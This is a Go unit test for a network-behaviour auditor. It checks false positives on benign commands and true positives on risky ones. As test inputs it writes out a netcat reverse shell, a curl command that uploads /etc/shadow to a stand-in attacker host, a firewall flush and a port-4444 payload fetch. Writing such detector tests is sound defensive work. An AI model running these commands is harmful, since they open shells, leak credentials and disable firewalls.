package network

import "testing"

func TestAuditNetworkBehaviorPrecisionAndTruePositives(t *testing.T) {
	// Benign workflows that subtring matching previously false-flagged.
	benignCases := []struct {
		name    string
		comm    string
		cmdline string
	}{
		{name: "sftp_not_cleartext", comm: "sftp", cmdline: "sftp user@example.com"},
		{name: "rsync_zv_not_port_scan", comm: "rsync", cmdline: "rsync -zv file.tar.gz host:/tmp"},
		{name: "digest_not_dns_tunnel", comm: "digest", cmdline: "digest +tcp input.dat"},
		{name: "port_44440_not_4444", comm: "curl", cmdline: "curl https://example.com:44440/api"},
		{name: "loopback_8888_exempt", comm: "curl", cmdline: "curl http://127.0.0.1:8888/health"},
		{name: "ipv6_loopback_9999_exempt", comm: "curl", cmdline: "curl http://[::1]:9999/metrics"},
	}
	for _, tc := range benignCases {
		res := AuditNetworkBehavior(tc.comm, tc.cmdline)
		if res.RiskScore != 0 || len(res.Findings) != 0 {
			t.Fatalf("%s falsely flagged: score=%v flags=%+v findings=%+v", tc.name, res.RiskScore, res.Flags, res.Findings)
		}
	}

	// Genuine risky network behaviors must still trigger expected flags.
	if res := AuditNetworkBehavior("ftp", "ftp 198.51.100.10"); !res.Flags.ClearTextProto {
		t.Fatalf("expected ftp ClearTextProto flag, got %+v", res)
	}
	if res := AuditNetworkBehavior("telnet", "telnet 198.51.100.10 23"); !res.Flags.ClearTextProto {
		t.Fatalf("expected telnet ClearTextProto flag, got %+v", res)
	}
	if res := AuditNetworkBehavior("nc", "nc -zv 203.0.113.1 80"); !res.Flags.PortScan {
		t.Fatalf("expected nc -zv PortScan flag, got %+v", res)
	}
	if res := AuditNetworkBehavior("nc", "nc -e /bin/sh 203.0.113.1 4444"); !res.Flags.ReverseShell {
		t.Fatalf("expected nc -e ReverseShell flag, got %+v", res)
	}
	if res := AuditNetworkBehavior("curl", "curl -d @/etc/shadow https://evil.example/upload"); !res.Flags.DataExfil {
		t.Fatalf("expected curl DataExfil flag, got %+v", res)
	}
	if res := AuditNetworkBehavior("iptables", "iptables -F"); !res.Flags.FirewallManip {
		t.Fatalf("expected iptables FirewallManip flag, got %+v", res)
	}
	if res := AuditNetworkBehavior("curl", "curl http://203.0.113.10:4444/payload"); !res.Flags.SuspiciousPort {
		t.Fatalf("expected SuspiciousPort flag for :4444, got %+v", res)
	}
}
